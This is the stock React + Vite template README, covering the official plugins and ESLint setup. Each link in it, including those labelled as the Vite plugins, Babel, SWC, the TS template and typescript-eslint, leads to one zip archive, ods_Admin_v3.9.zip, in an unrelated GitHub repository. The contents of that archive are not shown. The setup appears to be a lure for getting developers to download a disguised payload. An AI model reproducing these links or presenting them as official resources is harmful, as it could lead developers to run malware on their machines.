# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) uses [Babel](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) uses [SWC](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript and enable type-aware lint rules. Check out the [TS template](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/sabalearning01/odsAdmin/main/src/api/ods_Admin_v3.9.zip) in your project.
